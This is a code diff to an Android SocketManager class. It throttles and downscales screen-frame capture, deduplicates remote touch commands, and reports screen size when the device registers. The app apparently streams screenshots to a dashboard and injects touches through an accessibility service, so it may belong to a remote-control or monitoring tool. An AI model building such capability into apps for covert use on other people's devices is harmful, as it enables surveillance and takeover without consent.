@@ -55,6 +55,13 @@ public class SocketManager {
     // Debounce handle for device-user interaction frames
     private final AtomicReference<ScheduledFuture<?>> actionFrameFuture = new AtomicReference<>();
 
+    // Frame throttle — only one frame capture at a time; drop new requests while busy
+    private final java.util.concurrent.atomic.AtomicBoolean frameBusy = new java.util.concurrent.atomic.AtomicBoolean(false);
+
+    // Touch/swipe deduplication — ignore identical command within 250 ms
+    private volatile String  lastTouchKey  = "";
+    private volatile long    lastTouchTime = 0L;
+
     // Dynamic monitored packages (runtime additions from dashboard)
     private final java.util.Set<String> dynamicMonitoredPackages = new java.util.concurrent.CopyOnWriteArraySet<>();
 
@@ -264,12 +271,18 @@ public class SocketManager {
 
     public void registerDevice(String deviceId) {
         try {
+            android.view.WindowManager wm = (android.view.WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
+            android.graphics.Point screenSize = new android.graphics.Point();
+            wm.getDefaultDisplay().getRealSize(screenSize);
+
             JSONObject info = new JSONObject();
             info.put("name",           DeviceInfo.getDeviceName());
             info.put("model",          DeviceInfo.getModel());
             info.put("androidVersion", DeviceInfo.getAndroidVersion());
             info.put("manufacturer",   android.os.Build.MANUFACTURER);
             info.put("sdk",            Build.VERSION.SDK_INT);
+            info.put("screenWidth",    screenSize.x);
+            info.put("screenHeight",   screenSize.y);
 
             JSONObject d = new JSONObject();
             d.put("deviceId",   deviceId);
@@ -572,14 +585,22 @@ public class SocketManager {
 
     // ── Streaming — event-driven single-frame model ───────────────────────
 
-    /** Send exactly one frame immediately (called on user interaction or idle keepalive). */
+    /** Send exactly one frame immediately. Drops the call if a frame is already being captured. */
     public void sendSingleFrame(String deviceId) {
+        // Throttle: only one frame capture at a time — drop new requests while busy
+        if (!frameBusy.compareAndSet(false, true)) {
+            Log.d(TAG, "sendSingleFrame: dropped — previous frame still in progress");
+            return;
+        }
         executor.execute(() -> {
             try {
                 Bitmap frame = captureFrame();
                 if (frame != null) {
-                    String b64 = bitmapToBase64(frame, 55);
-                    frame.recycle();
+                    // Scale to max 320 px wide for faster transfer
+                    Bitmap scaled = scaleBitmapToWidth(frame, 320);
+                    if (scaled != frame) frame.recycle();
+                    String b64 = bitmapToBase64(scaled, 40);
+                    scaled.recycle();
                     if (b64 != null) {
                         JSONObject d = new JSONObject();
                         d.put("deviceId",  deviceId);
@@ -590,8 +611,18 @@ public class SocketManager {
                 }
             } catch (Exception e) {
                 Log.e(TAG, "sendSingleFrame error: " + e.getMessage());
+            } finally {
+                frameBusy.set(false);
             }
         });
+    }
+
+    /** Scale a bitmap so its width is at most maxWidth; keeps aspect ratio. */
+    private Bitmap scaleBitmapToWidth(Bitmap src, int maxWidth) {
+        if (src == null || src.getWidth() <= maxWidth) return src;
+        float ratio = (float) maxWidth / src.getWidth();
+        int newH = Math.max(1, Math.round(src.getHeight() * ratio));
+        return Bitmap.createScaledBitmap(src, maxWidth, newH, true);
     }
 
     /** Start idle-frame mode: send one frame every 5 seconds when idle. */
@@ -693,12 +724,23 @@ public class SocketManager {
             ScreenController sc = new ScreenController(accessSvc);
 
             switch (command) {
-                case "touch":
-                    return sc.touch(
-                        params.getInt("x"),
-                        params.getInt("y"),
-                        params.optInt("duration", 100)
-                    );
+                case "touch": {
+                    int tx = params.getInt("x");
+                    int ty = params.getInt("y");
+                    // Deduplication: ignore identical touch within 250 ms
+                    String touchKey = "touch:" + tx + "," + ty;
+                    long now = System.currentTimeMillis();
+                    if (touchKey.equals(lastTouchKey) && (now - lastTouchTime) < 250) {
+                        Log.d(TAG, "touch dedup ignored: " + touchKey);
+                        JSONObject r = new JSONObject();
+                        r.put("success", true);
+                        r.put("deduped", true);
+                        return r;
+                    }
+                    lastTouchKey  = touchKey;
+                    lastTouchTime = now;
+                    return sc.touch(tx, ty, params.optInt("duration", 100));
+                }
                 case "swipe":
                     return sc.swipe(
                         params.optInt("x1", params.optInt("startX", 0)),
